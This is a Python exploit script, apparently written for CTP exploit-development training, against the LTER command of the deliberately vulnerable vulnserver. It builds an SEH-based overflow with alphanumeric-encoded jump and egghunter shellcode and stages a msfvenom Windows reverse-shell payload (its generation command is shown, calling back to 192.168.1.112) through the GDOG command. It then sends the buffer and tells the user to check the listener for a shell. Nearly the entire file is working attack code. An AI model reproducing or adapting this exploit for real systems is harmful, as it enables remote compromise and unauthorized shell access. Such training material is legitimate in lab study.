#!/usr/bin/python

#
# This python script exploits the vulnserver LTER parameter with a reverse shell
# I created it during following CTP training
# This is not the most elegant solution, but it did work.
# enjoy!
#
import socket
import os
import sys
import time
#

#
# Three Arguments for all our VulnServer targets including the script itself. 
if len(sys.argv) != 3:
    print "[-] Usage: ./thisfile.py <ip> <port>\n" 
    print "[-] Example: ./thisfile.py 192.168.1.66 9999\n"
    print "[-] Try Harder!\n"
    sys.exit()


print "[-] Hello, looks like you survived the parameter quiz!\n"
print "[-] This script exploits the VulnServer LTER parameter with a reverse shell\n"
time.sleep(2)

#
# Define the script arguments.
# Hey what sucks more, added 5 arguments to a script, or rewriting the script everytime you need to change something?
# Answer, they suck equally but bash will let you arrow up your last xxx commands.
#
ip = sys.argv[1]
port = int(sys.argv[2])
size=int(5000)
popopret = "\x0a\x16\x50\x62"
# This takes advantage of FF - 7f (equal to 80) which gives me breathing room for the JEAX shellcode.
shorty="\x4c\x4c\x77\xff"
# This sets up EAX to a relative address further back, and jumps to it by zeroing and subtracting values from the AX register. The INC ESP allow me to push and pop to the stack without overwriting JMP EAX
jeax="\x54\x58\x66\x05\x70\x05\x66\x05\x70\x05\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x66\x2D\x01\x1F\x66\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x25\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x55\x58\x66\x05\x42\x03"
# Slightly modified encoded egghunter from HPNNM. I did some of my own hex calculations and the stack alignment is much simplier after the Jump EAX Shellcode
egghunter="\x66\x05\x2E\x01\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2a\x2D\x21\x55\x55\x55\x2D\x21\x54\x55\x55\x2D\x49\x6F\x55\x6D\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x30\x44\x03\x30\x2D\x10\x44\x01\x10\x2D\x11\x02\x11\x10\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x60\x60\x50\x03\x2D\x60\x24\x10\x01\x2D\x10\x24\x14\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x07\x23\x50\x65\x2D\x07\x23\x50\x65\x2D\x03\x01\x0B\x05\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x60\x60\x60\x50\x2D\x32\x59\x20\x21\x2D\x32\x41\x25\x1A\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x75\x55\x11\x55\x2D\x75\x26\x11\x55\x2D\x14\x2C\x10\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x39\x32\x32\x32\x2D\x39\x32\x32\x32\x2D\x7F\x59\x49\x31\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6E\x4F\x12\x7F\x2D\x1B\x1E\x12\x70\x2D\x11\x11\x11\x11\x50"
#
# Intended Payload.
# 
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.112 LPORT=19397 -b "\x00]x0a\x0d\x20" -f py EXITFUNC=seh | sed 's/buf/pay/g'
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 11 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
# Final size of py file: 1684 bytes
# The Payload follows

sled = "\x90"*8

pay = "GDOG "
pay +=  "T00WT00W"
pay += sled
pay += "\xbf\xa1\x2f\x1f\x73\xd9\xc6\xd9\x74\x24\xf4\x5a\x33"
pay += "\xc9\xb1\x52\x83\xea\xfc\x31\x7a\x0e\x03\xdb\x21\xfd"
pay += "\x86\xe7\xd6\x83\x69\x17\x27\xe4\xe0\xf2\x16\x24\x96"
pay += "\x77\x08\x94\xdc\xd5\xa5\x5f\xb0\xcd\x3e\x2d\x1d\xe2"
pay += "\xf7\x98\x7b\xcd\x08\xb0\xb8\x4c\x8b\xcb\xec\xae\xb2"
pay += "\x03\xe1\xaf\xf3\x7e\x08\xfd\xac\xf5\xbf\x11\xd8\x40"
pay += "\x7c\x9a\x92\x45\x04\x7f\x62\x67\x25\x2e\xf8\x3e\xe5"
pay += "\xd1\x2d\x4b\xac\xc9\x32\x76\x66\x62\x80\x0c\x79\xa2"
pay += "\xd8\xed\xd6\x8b\xd4\x1f\x26\xcc\xd3\xff\x5d\x24\x20"
pay += "\x7d\x66\xf3\x5a\x59\xe3\xe7\xfd\x2a\x53\xc3\xfc\xff"
pay += "\x02\x80\xf3\xb4\x41\xce\x17\x4a\x85\x65\x23\xc7\x28"
pay += "\xa9\xa5\x93\x0e\x6d\xed\x40\x2e\x34\x4b\x26\x4f\x26"
pay += "\x34\x97\xf5\x2d\xd9\xcc\x87\x6c\xb6\x21\xaa\x8e\x46"
pay += "\x2e\xbd\xfd\x74\xf1\x15\x69\x35\x7a\xb0\x6e\x3a\x51"
pay += "\x04\xe0\xc5\x5a\x75\x29\x02\x0e\x25\x41\xa3\x2f\xae"
pay += "\x91\x4c\xfa\x61\xc1\xe2\x55\xc2\xb1\x42\x06\xaa\xdb"
pay += "\x4c\x79\xca\xe4\x86\x12\x61\x1f\x41\xdd\xde\x1e\xe1"
pay += "\xb5\x1c\x20\x4a\x83\xa8\xc6\x26\x1b\xfd\x51\xdf\x82"
pay += "\xa4\x29\x7e\x4a\x73\x54\x40\xc0\x70\xa9\x0f\x21\xfc"
pay += "\xb9\xf8\xc1\x4b\xe3\xaf\xde\x61\x8b\x2c\x4c\xee\x4b"
pay += "\x3a\x6d\xb9\x1c\x6b\x43\xb0\xc8\x81\xfa\x6a\xee\x5b"
pay += "\x9a\x55\xaa\x87\x5f\x5b\x33\x45\xdb\x7f\x23\x93\xe4"
pay += "\x3b\x17\x4b\xb3\x95\xc1\x2d\x6d\x54\xbb\xe7\xc2\x3e"
pay += "\x2b\x71\x29\x81\x2d\x7e\x64\x77\xd1\xcf\xd1\xce\xee"
pay += "\xe0\xb5\xc6\x97\x1c\x26\x28\x42\xa5\x58\xd8\x5e\x30"
pay += "\xcc\x43\x0b\x79\x90\x73\xe6\xbe\xad\xf7\x02\x3f\x4a"
pay += "\xe7\x67\x3a\x16\xaf\x94\x36\x07\x5a\x9a\xe5\x28\x4f"
pay += "\n"


# Define the variable "crash"
# I divide the letters alot so I can see what where I am relative to the buffer.

crash="A"*1700
crash+="B"*50 
crash+=egghunter
crash+="B"*(1580-len(egghunter))
crash+="C"*61
crash+=jeax
crash+="B"*(124 - len(jeax)) # See where this is in relation to FF48
crash+=shorty
crash+=popopret
crash+="F"*30
crash+="E"*2

buffer="LTER"
buffer+=" /.:/" # GMON needs this, I do not know if the other params do.
buffer+=crash + "\n"

print "[-] Here we go!\n"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
print "[-] Sending Help to vulnserver!\n"
expl.connect((ip, port))
expl.send("HELP\n")
time.sleep(.5)
print "[-] Sending the shell to gdog\n"
expl.send(pay)
time.sleep(.5)
print "[-] Sending evil buffer with three stage shellcode, and a lot of letters!\n"
expl.send(buffer)
time.sleep(.25)
expl.send("EXIT\n")
time.sleep(.5) # Why rush

print "[-] Sent, check listener for reverse shell!"

exit()
